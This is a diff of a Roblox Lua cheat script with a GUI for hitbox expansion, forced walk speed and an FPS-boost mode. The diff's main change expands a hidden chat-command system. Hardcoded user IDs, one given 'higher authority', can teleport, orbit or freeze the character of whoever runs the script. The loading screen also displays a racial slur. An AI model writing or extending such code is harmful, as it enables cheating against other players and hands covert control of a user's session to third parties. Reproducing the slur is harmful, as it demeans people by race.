@@ -1,4 +1,7 @@
--- update finally 3/11/2026 fixed sinking into ground issue and added speed walk pussy
+-- update 3/12/2026 - command system now fully supports multiple users
+-- both IDs work (commands trigger when either speaks)
+-- 7629683153 has HIGHER AUTHORITY: your commands instantly override / overpower the other user's control
+-- (target = the issuer, with priority selection if a message somehow mentions both)
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -19,7 +22,6 @@ local hitboxEnabled = false
 local teamCheck = false
 local walkSpeedEnabled = false
 local walkSpeedValue = 50
-
 local defaultHitboxSize = 7
 local hitboxTransparency = 0.9
 
@@ -28,6 +30,7 @@ local commandUserIds = {
     [8846937563] = true,
 }
 
+local higherAuthorityId = 7629683153  -- YOU have higher authority (commands from you instantly overpower)
 local commandListenerEnabled = true
 
 -- ===== COOL TEXT LOADING SCREEN =====
@@ -38,7 +41,6 @@ loadingGui.IgnoreGuiInset = true
 loadingGui.Parent = PlayerGui
 
 local fullText = "Fuck you nigger"
-
 local container = Instance.new("Frame")
 container.Size = UDim2.new(0, 600, 0, 40)
 container.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -56,7 +58,6 @@ baseLabel.TextStrokeTransparency = 0.7
 baseLabel.TextXAlignment = Enum.TextXAlignment.Center
 baseLabel.TextYAlignment = Enum.TextYAlignment.Center
 baseLabel.Parent = container
-
 baseLabel.Text = string.rep(" ", #fullText)
 
 for i = 1, #fullText do
@@ -65,9 +66,7 @@ for i = 1, #fullText do
     baseLabel.Text = shown .. hidden
     task.wait(0.05)
 end
-
 task.wait(2)
-
 for i = 1, #fullText do
     local hidden = string.rep(" ", i)
     local shown = fullText:sub(i + 1)
@@ -94,7 +93,6 @@ local originalLighting = {
     EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
     EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
 }
-
 local originalGraphicsQuality = 10
 pcall(function()
     originalGraphicsQuality = settings().Rendering.QualityLevel
@@ -113,6 +111,7 @@ frame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
 frame.Active = true
 frame.Draggable = true
 frame.Visible = false
+
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 12)
 
@@ -140,6 +139,7 @@ guiToggleBtn.Font = Enum.Font.Gotham
 guiToggleBtn.ZIndex = 10
 guiToggleBtn.Active = true
 guiToggleBtn.Draggable = true
+
 local toggleCorner = Instance.new("UICorner", guiToggleBtn)
 toggleCorner.CornerRadius = UDim.new(0, 8)
 
@@ -178,7 +178,6 @@ task.spawn(function()
     frame.Visible = true
     local originalSize = frame.Size
     local originalPos = frame.Position
-
     frame.Size = UDim2.new(0, 2, 0, 2)
     frame.Position = UDim2.new(
         originalPos.X.Scale,
@@ -186,7 +185,6 @@ task.spawn(function()
         originalPos.Y.Scale,
         originalPos.Y.Offset + originalSize.Y.Offset / 2 - 1
     )
-
     local tweenFrame = TweenService:Create(
         frame,
         TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
@@ -194,12 +192,10 @@ task.spawn(function()
     )
     tweenFrame:Play()
     tweenFrame.Completed:Wait()
-
     for i, btn in ipairs(tabButtons) do
         btn.Visible = true
         local originalBtnSize = btn.Size
         btn.Size = UDim2.new(originalBtnSize.X.Scale, originalBtnSize.X.Offset, 0, 0)
-
         local tweenBtn = TweenService:Create(
             btn,
             TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
@@ -318,7 +314,6 @@ local function makeToggle(parent, labelText, pos, initialState, callback)
         toggleBtn.BackgroundColor3 = newState and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(200, 0, 0)
         callback(newState)
     end)
-
     return frameToggle, toggleBtn
 end
 
@@ -349,7 +344,6 @@ local decreaseButton = makeButton(pageMain, "Decrease Speed", UDim2.new(0, 0, 0,
 local speedBox = makeTextbox(pageMain, "Enter Speed", tostring(speedMultiplier), UDim2.new(0, 0, 0, 152))
 
 local isAnimating = false
-
 local function updateStatusBubble(enabled)
     if enabled then
         statusContainer.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
@@ -397,7 +391,6 @@ end)
 -- ===== HITBOX TAB CONTENT =====
 local hitboxLabel = makeLabel(pageHitbox, "Hitbox Size (default 7)", UDim2.new(0, 0, 0, 0))
 local hitboxSizeBox = makeTextbox(pageHitbox, "Hitbox Size", tostring(defaultHitboxSize), UDim2.new(0, 0, 0, 22))
-
 local transparencyLabel = makeLabel(pageHitbox, "Hitbox Transparency (0 - 1)", UDim2.new(0, 0, 0, 52))
 local transparencyBox = makeTextbox(pageHitbox, "Transparency", tostring(hitboxTransparency), UDim2.new(0, 0, 0, 72))
 
@@ -435,7 +428,6 @@ end
 function applyHitboxes()
     local size = tonumber(hitboxSizeBox.Text) or defaultHitboxSize
     local transparency = tonumber(transparencyBox.Text) or hitboxTransparency
-
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
             if not teamCheck or plr.Team ~= player.Team then
@@ -486,6 +478,7 @@ end
 hitboxSizeBox.FocusLost:Connect(function()
     if hitboxEnabled then applyHitboxes() end
 end)
+
 transparencyBox.FocusLost:Connect(function()
     if hitboxEnabled then applyHitboxes() end
 end)
@@ -508,6 +501,7 @@ Players.PlayerAdded:Connect(function(plr)
         if hitboxEnabled then applyHitboxes() end
     end)
 end)
+
 for _, plr in pairs(Players:GetPlayers()) do
     plr.CharacterAdded:Connect(function()
         task.wait(1)
@@ -537,7 +531,6 @@ local walkSpeedConnection = nil
 function applyWalkSpeed()
     walkSpeedValue = tonumber(speedBox.Text) or 50
     if walkSpeedConnection then walkSpeedConnection:Disconnect() walkSpeedConnection = nil end
-
     walkSpeedConnection = RunService.Heartbeat:Connect(function()
         if not walkSpeedEnabled then return end
         local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
@@ -567,7 +560,6 @@ end)
 local fpsButton = makeButton(pageExtra, "Toggle FPS Boost", UDim2.new(0, 0, 0, 30))
 fpsButton.MouseButton1Click:Connect(function()
     if not isFPSBoosted then
-        -- === ULTRA AGGRESSIVE FPS BOOST START ===
         Lighting.GlobalShadows = false
         Lighting.Brightness = 0
         Lighting.FogEnd = 1e10
@@ -580,13 +572,11 @@ fpsButton.MouseButton1Click:Connect(function()
         Lighting.ShadowSoftness = 0
         Lighting.EnvironmentDiffuseScale = 0
         Lighting.EnvironmentSpecularScale = 0
-        
         pcall(function()
             settings().Rendering.QualityLevel = 1
             settings().Rendering.FrameRateManager = 2
         end)
 
-        -- AGGRESSIVE MAP CLEANUP (this is what makes FPS explode in fights)
         for _, descendant in pairs(workspace:GetDescendants()) do
             pcall(function()
                 if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Beam") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Sparkles") then
@@ -599,7 +589,6 @@ fpsButton.MouseButton1Click:Connect(function()
                     descendant.Transparency = 1
                 elseif descendant:IsA("BasePart") then
                     descendant.CastShadow = false
-                    -- Skip YOUR character so you still look normal
                     local char = player.Character
                     if not (char and descendant:IsDescendantOf(char)) then
                         descendant.Material = Enum.Material.Plastic
@@ -608,11 +597,9 @@ fpsButton.MouseButton1Click:Connect(function()
             end)
         end
 
-        -- Remove sky completely
         local sky = Lighting:FindFirstChildOfClass("Sky")
         if sky then sky:Destroy() end
 
-        -- Terrain water kill
         if workspace:FindFirstChild("Terrain") then
             workspace.Terrain.WaterWaveSize = 0
             workspace.Terrain.WaterWaveSpeed = 0
@@ -620,7 +607,6 @@ fpsButton.MouseButton1Click:Connect(function()
             workspace.Terrain.WaterTransparency = 1
         end
 
-        -- Catch every new effect forever
         workspace.DescendantAdded:Connect(function(descendant)
             if isFPSBoosted then
                 pcall(function()
@@ -646,7 +632,6 @@ fpsButton.MouseButton1Click:Connect(function()
         isFPSBoosted = true
         fpsButton.Text = "Restore Graphics (FPS OFF)"
     else
-        -- Restore original lighting & quality
         Lighting.Brightness = originalLighting.Brightness
         Lighting.FogEnd = originalLighting.FogEnd
         Lighting.GlobalShadows = originalLighting.GlobalShadows
@@ -659,11 +644,9 @@ fpsButton.MouseButton1Click:Connect(function()
         Lighting.ShadowSoftness = originalLighting.ShadowSoftness
         Lighting.EnvironmentDiffuseScale = originalLighting.EnvironmentDiffuseScale
         Lighting.EnvironmentSpecularScale = originalLighting.EnvironmentSpecularScale
-        
         pcall(function()
             settings().Rendering.QualityLevel = originalGraphicsQuality
         end)
-
         isFPSBoosted = false
         fpsButton.Text = "Toggle FPS Boost"
     end
@@ -676,7 +659,6 @@ end)
 
 local keybindLabel = makeLabel(pageExtra, "Toggle GUI Keybind:", UDim2.new(0, 0, 0, 90))
 local keybindBox = makeTextbox(pageExtra, "Keybind", guiToggleKey.Name, UDim2.new(0, 0, 0, 112))
-
 keybindBox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
         local keyName = keybindBox.Text:upper()
@@ -698,7 +680,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
--- ===== COMMAND SYSTEM (unchanged) =====
+-- ===== COMMAND SYSTEM (updated for 2 users + higher authority) =====
 local lastCommand = ""
 local previousCommands = {}
 local isOrbiting = false
@@ -726,7 +708,7 @@ local function safeMoveLocalTo(targetCFrame)
     if not hrp then return end
     task.wait(0.04 + math.random() * 0.14)
     local dur = 0.12 + math.random() * 0.18
-    pcall(function() 
+    pcall(function()
         local info = TweenInfo.new(math.clamp(dur, 0.06, 1.2), Enum.EasingStyle.Linear)
         local tween = TweenService:Create(hrp, info, {CFrame = targetCFrame})
         tween:Play()
@@ -744,6 +726,7 @@ local function teleportTo(target)
 end
 
 local orbitData = {enabled = false, angle = 0, radius = 5, speed = math.pi}
+
 local function orbitPlayer(target)
     if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
     orbitData.enabled = not orbitData.enabled
@@ -833,8 +816,8 @@ end
 local function stopAll()
     if orbitConnection then orbitConnection:Disconnect() orbitConnection = nil end
     if standConnection then standConnection:Disconnect() standConnection = nil end
-    if freezeConnection then 
-        freezeConnection:Disconnect() 
+    if freezeConnection then
+        freezeConnection:Disconnect()
         freezeConnection = nil
         local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
         if hum then hum.PlatformStand = false end
@@ -850,15 +833,11 @@ end
 local lastCommandTime = 0
 local commandCooldown = 0.8
 
-local function handleCommand(cmd)
+local function handleCommand(cmd, issuer)
     if tick() - lastCommandTime < commandCooldown then return end
     lastCommandTime = tick()
 
-    local targetPlayer = nil
-    for id in pairs(commandUserIds) do
-        local p = Players:GetPlayerByUserId(id)
-        if p then targetPlayer = p break end
-    end
+    local targetPlayer = issuer  -- the person who actually said the command (higher authority wins)
 
     if cmd == "!bring" then
         if targetPlayer then teleportTo(targetPlayer) end
@@ -909,11 +888,27 @@ local function monitorChatUI()
         local function checkText()
             local txt = tostring(lbl.Text):lower()
             if txt:find("!") then
+                local matchingUsers = {}
                 for id in pairs(commandUserIds) do
                     local commandUser = Players:GetPlayerByUserId(id)
                     if commandUser and txt:find(commandUser.Name:lower()) then
-                        local cmdword = txt:match("!(%w+)")
-                        if cmdword then handleCommand("!" .. cmdword) end
+                        table.insert(matchingUsers, commandUser)
+                    end
+                end
+                if #matchingUsers > 0 then
+                    -- HIGHER AUTHORITY PRIORITY: you (7629683153) always win if your name appears
+                    local selectedIssuer = nil
+                    for _, u in ipairs(matchingUsers) do
+                        if u.UserId == higherAuthorityId then
+                            selectedIssuer = u
+                            break
+                        elseif not selectedIssuer then
+                            selectedIssuer = u
+                        end
+                    end
+                    local cmdword = txt:match("!(%w+)")
+                    if cmdword and selectedIssuer then
+                        handleCommand("!" .. cmdword, selectedIssuer)
                     end
                 end
             end
